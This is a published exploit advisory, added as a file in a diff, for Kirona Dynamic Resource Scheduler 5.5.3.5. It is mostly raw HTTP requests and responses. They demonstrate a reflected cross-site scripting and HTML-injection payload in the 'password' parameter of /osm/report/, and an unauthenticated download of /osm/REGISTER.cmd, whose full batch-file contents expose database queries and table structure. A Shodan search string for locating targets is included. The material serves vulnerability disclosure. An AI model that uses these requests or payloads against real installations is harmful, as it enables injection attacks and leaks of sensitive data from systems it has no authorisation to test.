@@ -1,0 +1,329 @@
+# Exploit Title: Kirona-DRS 5.5.3.5 - Information Disclosure
+# Discovered Date: 2019-10-03
+# Shodan Search: /opt-portal/pages/login.xhtml
+# Exploit Author: Ramikan
+# Vendor Homepage: https://www.kirona.com/products/dynamic-resource-scheduler/
+# Affected Version: DRS 5.5.3.5 may be other versions.
+# Tested On Version: DRS 5.5.3.5 on PHP/5.6.14
+# Vendor Fix: Unknown
+# CVE: CVE-2019-17503,CVE-2019-17504
+# Category: Web Apps
+# Reference : https://github.com/Ramikan/Vulnerabilities/blob/master/Kirona-DRS 5.5.3.5 Multiple Vulnerabilities
+
+# Description:
+# The application is vulnerable to the HTML injection, reflected cross site scripting and sensitive data disclosure.
+
+# Vulnerabiity 1:HTML injection and  (CVE-2019-17504)
+# An issue was discovered in Kirona Dynamic Resource Scheduling (DRS) 5.5.3.5. A reflected Cross-site scripting (XSS) 
+# vulnerability allows remote attackers to inject arbitrary web script via the /osm/report/ 'password' parameter.
+
+Affected URL: /osm/report/ 
+
+Affected Parameter: password
+
+
+POST Request:
+
+POST /osm/report/ HTTP/1.1
+Host: 10.50.3.148
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-GB,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 147
+Connection: close
+Referer: https://10.50.3.148/osm/report/
+Upgrade-Insecure-Requests: 1
+
+create=true&password=&login=admin&password='<" ><<h1>HTML Injection-heading tag used</h1><script>alert("This is Cross Site Scripting")</script><!--
+
+
+Response:
+
+HTTP/1.1 200 OK
+Date: Thu, 03 Oct 2019 14:56:05 GMT
+Server: Apache
+X-Powered-By: PHP/5.6.14
+Access-Control-Allow-Origin: *
+Access-Control-Allow-Headers: X-Requested-WithXDomainRequestAllowed: 1
+Expires: Mon, 26 Jul 1997 05:00:00 GMT
+Last-Modified: Thu, 03 Oct 2019 14:56:05 GMT
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 728
+Connection: close
+Content-Type: text/html;charset=UTF-8
+
+          <html>
+          <head>  
+            <img src='logo.jpg'>      
+            <form method='POST'>
+              <input type='hidden' name='create' value='true'/>
+              <input type='hidden' name='password' value=''<" ><<h1>HTML Injection-heading tag used</h1><script>alert("This is Cross Site Scripting")</script><!--'/>
+              <table>
+                  <tr><td>Login:</td><td><input type='login' name='login'/></td></tr>
+                  <tr><td>Password:</td><td><input type='password' name='password'/></td></tr>
+                  <tr><td colspan='2'><input type='submit' value='Login'/> </td></tr>
+              </table>
+            </form>
+          </head>
+          </html>
+
+
+GET Request:
+
+GET https://10.0.1.110/osm/report/?password=%27%3C%22%20%3E%3C%3Ch1%3EHTML%20Injection-heading%20tag%20used%3C/h1%3E%3Cscript%3Ealert(%22This%20is%20Cross%20Site%20Scripting%22)%3C/script%3E%3C!-- HTTP/1.1
+Host: vs-kdrs-l-01.selwoodhousing.local
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-GB,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+
+Response:
+
+HTTP/1.1 200 OK
+Date: Thu, 03 Oct 2019 14:53:35 GMT
+Server: Apache
+X-Powered-By: PHP/5.6.14
+Access-Control-Allow-Origin: *
+Access-Control-Allow-Headers: X-Requested-With
+XDomainRequestAllowed: 1
+Expires: Mon, 26 Jul 1997 05:00:00 GMT
+Last-Modified: Thu, 03 Oct 2019 14:53:35 GMT
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 728
+Connection: close
+Content-Type: text/html;charset=UTF-8
+
+          <html>
+          <head>  
+            <img src='logo.jpg'>      
+            <form method='POST'>
+              <input type='hidden' name='create' value='true'/>
+              <input type='hidden' name='password' value=''<" ><<h1>HTML Injection-heading tag used</h1><script>alert("This is Cross Site Scripting")</script><!--'/>
+              <table>
+                  <tr><td>Login:</td><td><input type='login' name='login'/></td></tr>
+                  <tr><td>Password:</td><td><input type='password' name='password'/></td></tr>
+                  <tr><td colspan='2'><input type='submit' value='Login'/> </td></tr>
+              </table>
+            </form>
+          </head>
+          </html> 
+        
+
+***************************************************************************************************************************
+Vulnerability 2: Source code and sensitive data disclosure. (CVE-2019-17503)
+***************************************************************************************************************************
+
+An issue was discovered in Kirona Dynamic Resource Scheduling (DRS) 5.5.3.5. An unauthenticated user can access /osm/REGISTER.cmd (aka /osm_tiles/REGISTER.cmd) directly: it contains sensitive information about the database through the SQL queries within this batch file. This file exposes SQL database information such as database version, table name, column name, etc.
+
+Affected URL: /osm/REGISTER.cmd or /osm_tiles/REGISTER.cmd
+
+# Request:
+
+GET /osm/REGISTER.cmd HTTP/1.1
+Host: 10.0.0.148
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-GB,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+
+Response:
+
+HTTP/1.1 200 OK
+Date: Thu, 03 Oct 2019 09:23:54 GMT
+Server: Apache
+Last-Modified: Tue, 07 Nov 2017 09:27:52 GMT
+ETag: "1fc4-55d612f6cae13"
+Accept-Ranges: bytes
+Content-Length: 8132
+Connection: close
+
+@echo off
+
+set DEBUGMAPSCRIPT=TRUE
+
+rem
+rem Find root path and batch name
+rem root path is found relative to the current batch name
+rem 
+
+rem turn to short filename (remove white spaces)
+for %%i in (%0) do (
+  	set SHORT_MAPSCRIPTBATCH_FILE=%%~fsi
+    set MAPSCRIPTBATCH_FILE=%%~i
+    
+)
+for %%i in (%SHORT_MAPSCRIPTBATCH_FILE%) do (
+	set MAPSCRIPTROOTDIR=%%~di%%~pi..\..\..
+)
+
+if "%DEBUGMAPSCRIPT%"=="TRUE" echo MAPSCRIPTROOTDIR=%MAPSCRIPTROOTDIR%
+if "%DEBUGMAPSCRIPT%"=="TRUE" echo MAPSCRIPTBATCH_FILE=%MAPSCRIPTBATCH_FILE%
+
+rem
+rem find if we are in INTERRACTIVE mode or not and check the parameters
+rem 
+if "%1"=="" goto INTERACTIVE
+goto NONINTERRACTIVE
+
+
+:NONINTERRACTIVE
+rem non interractive call so catch the parameters from command line
+rem this is supposed to be called from the root DRS directory
+
+if "%2"=="" (
+  echo Invalid parameter 2
+  pause
+  goto :EOF
+)
+
+set ACCOUNT=%2
+set STATIC=NO
+if "%1"=="STATIC" set STATIC=YES
+
+if "%DEBUGMAPSCRIPT%"=="TRUE" echo Command line mode %STATIC% %ACCOUNT%
+
+if "%1"=="STATIC" goto GLOBAL
+if "%1"=="DYNAMIC" goto GLOBAL
+echo Invalid parameter 1
+pause
+goto :EOF
+
+:INTERACTIVE
+rem Interractive mode : ask for account and static mode
+if "%DEBUGMAPSCRIPT%"=="TRUE" echo Interractive mode
+echo Open Street Map setup for Xmbrace DRS
+set /P ACCOUNT=Account name:
+set /P STATIC=Limited map feature (YES/NO):
+
+
+rem back to the setup directory
+cd %MAPSCRIPTROOTDIR%
+
+rem # READ AND DEFINE SETTINGS
+for /F "tokens=1,* delims==" %%k in (conf\default.txt) do (
+  if not "%%k"=="#=" set %%k=%%l
+)
+if exist CUSTOM\CONF\custom.txt (
+  for /F "tokens=1,* delims==" %%k in (CUSTOM\CONF\custom.txt) do (
+    if not "%%k"=="#=" set %%k=%%l
+  )
+)
+for /F "tokens=1,* delims==" %%k in (conf\settings.txt) do (
+  if not "%%k"=="#=" set %%k=%%l
+)
+
+if "%APACHE_USE_SSL%"=="TRUE" (
+  set DEFAULT_HTTP_PROTOCOL=https
+  set APACHE_USE_SSL_VALUE=true
+  set DEFAULT_HTTP_PORT=%APACHE_HTTPS_PORT%
+) else (
+  set DEFAULT_HTTP_PROTOCOL=http
+  set APACHE_USE_SSL_VALUE=false
+  set DEFAULT_HTTP_PORT=%APACHE_HTTP_PORT%
+)
+
+goto GLOBAL
+
+
+
+rem
+rem good to go in a non interractive mode
+rem the following is the generic par of the install, whatever we are in static or dynamic mode
+rem
+:GLOBAL
+if "%DEBUGMAPSCRIPT%"=="TRUE" echo Global section
+
+set MYSQL="MYSQL\MySQL Server 5.6 MariaDB\bin\mysql.exe"
+
+echo delete from %ACCOUNT%.asp_custom_action where CA_CAPTION in ('Show on map','Closest')> req.sql
+%MYSQL% mysql --port=%MYSQL_TCP_PORT% --verbose --user=%MYSQL_LOGIN% --password=%MYSQL_PASSWORD% < req.sql
+
+echo delete from %ACCOUNT%.asp_custom_tab where NAME='Map'> req.sql
+%MYSQL% mysql --port=%MYSQL_TCP_PORT% --verbose --user=%MYSQL_LOGIN% --password=%MYSQL_PASSWORD% < req.sql
+
+set INSERTFIELDS=%ACCOUNT%.asp_custom_action (CA_CAPTION,CA_VIEW,CA_MODE,CA_LIST_MODE,CA_HEIGHT,CA_WIDTH,CA_RESIZABLE,CA_NEED_REFRESH,CA_PROFILES,CA_URL,CA_CUSTOM_TAB,CA_TRIGGER_MODE)
+
+if "%STATIC%"=="YES" goto :STATIC
+goto :DYNAMIC
+
+
+
+:STATIC
+
+if "%DEBUGMAPSCRIPT%"=="TRUE" echo Static section
+
+echo map=static > ACCOUNTS\%ACCOUNT%\config.txt
+
+echo ^<?php $staticMap=true; ?^>>APACHE\htdocs\osm\mode.php
+
+echo insert into %INSERTFIELDS% values ('Journey on map','workerList','modal','unique',600,1024,true,false,'Administrator','%DEFAULT_HTTP_PROTOCOL%://%OTRMS_HOST%:%DEFAULT_HTTP_PORT%/osm/map.php?account=%ACCOUNT%^&mapType=journey','','button')> req.sql
+%MYSQL% mysql --port=%MYSQL_TCP_PORT% --verbose --user=%MYSQL_LOGIN% --password=%MYSQL_PASSWORD% < req.sql
+echo insert into %INSERTFIELDS% values ('Journey on map','workerView','modal','unique',600,1024,true,false,'Administrator','%DEFAULT_HTTP_PROTOCOL%://%OTRMS_HOST%:%DEFAULT_HTTP_PORT%/osm/map.php?account=%ACCOUNT%^&mapType=journey','','button')> req.sql
+%MYSQL% mysql --port=%MYSQL_TCP_PORT% --verbose --user=%MYSQL_LOGIN% --password=%MYSQL_PASSWORD% < req.sql
+if exist req.sql del req.sql
+goto FINAL
+
+
+:DYNAMIC
+
+if "%DEBUGMAPSCRIPT%"=="TRUE" echo Dynamic section
+
+echo map=dynamic > ACCOUNTS\%ACCOUNT%\config.txt
+
+echo ^<?php $staticMap=false; ?^>>APACHE\htdocs\osm\mode.php
+
+echo insert into %INSERTFIELDS% values ('Show on map','jobList','customTab','mandatory',600,1024,true,false,'Administrator','','Map','button')> req.sql
+%MYSQL% mysql --port=%MYSQL_TCP_PORT% --verbose --user=%MYSQL_LOGIN% --password=%MYSQL_PASSWORD% < req.sql
+echo insert into %INSERTFIELDS% values ('Show on map','jobView','customTab','mandatory',600,1024,true,false,'Administrator','','Map','button')> req.sql
+%MYSQL% mysql --port=%MYSQL_TCP_PORT% --verbose --user=%MYSQL_LOGIN% --password=%MYSQL_PASSWORD% < req.sql
+
+echo insert into %INSERTFIELDS% values ('Closest','jobList','modal','unique',600,1024,true,false,'Administrator','%DEFAULT_HTTP_PROTOCOL%://%OTRMS_HOST%:%DEFAULT_HTTP_PORT%/osm/map.php?account=%ACCOUNT%^&mapType=closest','','button')> req.sql
+%MYSQL% mysql --port=%MYSQL_TCP_PORT% --verbose --user=%MYSQL_LOGIN% --password=%MYSQL_PASSWORD% < req.sql
+echo insert into %INSERTFIELDS% values ('Closest','jobView','modal','unique',600,1024,true,false,'Administrator','%DEFAULT_HTTP_PROTOCOL%://%OTRMS_HOST%:%DEFAULT_HTTP_PORT%/osm/map.php?account=%ACCOUNT%^&mapType=closest','','button')> req.sql
+%MYSQL% mysql --port=%MYSQL_TCP_PORT% --verbose --user=%MYSQL_LOGIN% --password=%MYSQL_PASSWORD% < req.sql
+
+echo insert into %INSERTFIELDS% values ('Show on map','workerList','customTab','mandatory',600,1024,true,false,'Administrator','','Map','button')> req.sql
+%MYSQL% mysql --port=%MYSQL_TCP_PORT% --verbose --user=%MYSQL_LOGIN% --password=%MYSQL_PASSWORD% < req.sql
+echo insert into %INSERTFIELDS% values ('Show on map','workerView','customTab','mandatory',600,1024,true,false,'Administrator','','Map','button')> req.sql
+%MYSQL% mysql --port=%MYSQL_TCP_PORT% --verbose --user=%MYSQL_LOGIN% --password=%MYSQL_PASSWORD% < req.sql
+
+echo insert into %INSERTFIELDS% values ('Journey on map','workerList','modal','mandatory',600,1024,true,false,'Administrator','%DEFAULT_HTTP_PROTOCOL%://%OTRMS_HOST%:%DEFAULT_HTTP_PORT%/osm/map.php?account=%ACCOUNT%^&mapType=journey','','button')> req.sql
+rem %MYSQL% mysql --port=%MYSQL_TCP_PORT% --verbose --user=%MYSQL_LOGIN% --password=%MYSQL_PASSWORD% < req.sql
+
+echo insert into %INSERTFIELDS% values ('Show on map','customerList','customTab','mandatory',600,1024,true,false,'Administrator','','Map','button')> req.sql
+%MYSQL% mysql --port=%MYSQL_TCP_PORT% --verbose --user=%MYSQL_LOGIN% --password=%MYSQL_PASSWORD% < req.sql
+echo insert into %INSERTFIELDS% values ('Show on map','customerView','customTab','mandatory',600,1024,true,false,'Administrator','','Map','button')> req.sql
+%MYSQL% mysql --port=%MYSQL_TCP_PORT% --verbose --user=%MYSQL_LOGIN% --password=%MYSQL_PASSWORD% < req.sql
+
+echo insert into %INSERTFIELDS% values ('Show on map','serviceOrderList','customTab','mandatory',600,1024,true,false,'Administrator','','Map','button')> req.sql
+%MYSQL% mysql --port=%MYSQL_TCP_PORT% --verbose --user=%MYSQL_LOGIN% --password=%MYSQL_PASSWORD% < req.sql
+echo insert into %INSERTFIELDS% values ('Show on map','serviceOrderView','customTab','mandatory',600,1024,true,false,'Administrator','','Map','button')> req.sql
+%MYSQL% mysql --port=%MYSQL_TCP_PORT% --verbose --user=%MYSQL_LOGIN% --password=%MYSQL_PASSWORD% < req.sql
+
+echo insert into %INSERTFIELDS% values ('Show on map','planning','customTab','mandatory',600,1024,true,false,'Administrator','','Map','button')> req.sql
+%MYSQL% mysql --port=%MYSQL_TCP_PORT% --verbose --user=%MYSQL_LOGIN% --password=%MYSQL_PASSWORD% < req.sql
+
+
+set INSERTFIELDS=%ACCOUNT%.asp_custom_tab (NAME,POSITION,ADMIN,URL,WIDTH,HEIGHT)
+
+echo insert into %INSERTFIELDS% values ('Map',0,'false','%DEFAULT_HTTP_PROTOCOL%://%OTRMS_HOST%:%DEFAULT_HTTP_PORT%/osm/map.php?account=%ACCOUNT%','100%%','100%%')> req.sql
+%MYSQL% mysql --port=%MYSQL_TCP_PORT% --verbose --user=%MYSQL_LOGIN% --password=%MYSQL_PASSWORD% < req.sql
+
+if exist req.sql del req.sql
+goto FINAL
+
+
+:FINAL
+echo Map registred for %ACCOUNT%
+if "%1"=="" pause
+goto :EOF
